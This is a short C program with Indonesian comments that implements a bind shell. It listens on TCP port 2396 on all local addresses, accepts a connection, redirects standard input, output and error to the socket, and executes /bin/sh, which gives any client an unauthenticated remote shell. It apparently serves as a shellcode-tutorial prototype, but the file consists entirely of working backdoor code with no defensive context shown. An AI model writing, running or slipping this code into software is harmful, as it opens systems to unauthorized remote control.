#include <sys/socket.h>
#include <netinet/in.h>

int main() {
        char *shell[2];
        int server; // server socket file handler
        int client; // client socket file handler
        struct sockaddr_in serv_addr; // definisi ipaddress dan port

        server=socket(2,1,0); // membuat socket STREAM
        serv_addr.sin_addr.s_addr=0; // ip address ALL LOCAL address
        serv_addr.sin_port=0x5C09; // port 2396 dalam network byte order
        serv_addr.sin_family=2; // Jenis address IP
        bind(server,(struct sockaddr*)&serv_addr,16); // bind socket ke port dan ipaddress
        listen(server,0); // menunggu koneksi dari client
        client=accept(server,0,0); // koneksi dari client sudah terjalin

        dup2(client,0); // duplicate stdin ke client socket
        dup2(client,1); // duplicate stdout ke client socket
        dup2(client,2); // duplicate stderr ke cilent socket

        shell[0] = "/bin/sh";
        shell[1] = 0;
        execve(shell[0],shell,0); // execute shell dengan stdin,stdout dan stderr ke socket
}
